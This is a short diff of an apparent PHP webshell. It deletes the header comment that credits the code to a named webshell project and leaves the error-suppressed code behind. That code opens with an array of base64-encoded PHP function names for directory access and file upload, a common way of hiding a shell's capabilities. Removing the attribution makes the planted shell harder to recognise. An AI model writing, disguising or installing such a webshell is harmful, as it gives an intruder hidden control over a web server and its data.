@@ -1,14 +1,5 @@
 <?php
 error_reporting(0);
-/**
- *	@author LittleJok3r
- *	@version 1.0 Beta
- *	@link https://github.com/apaajalahx/webshell
- *	Responsive And No Load.
- *	Terinspirasi oleh MARIJUANA WEBSHELL
- *	@link https://github.com/0x5a455553/MARIJUANA
- *
- */
 $apa = ["Z2V0Y3dk",
 		"YmFzZW5hbWU=",
 		"bW92ZV91cGxvYWRlZF9maWxl",
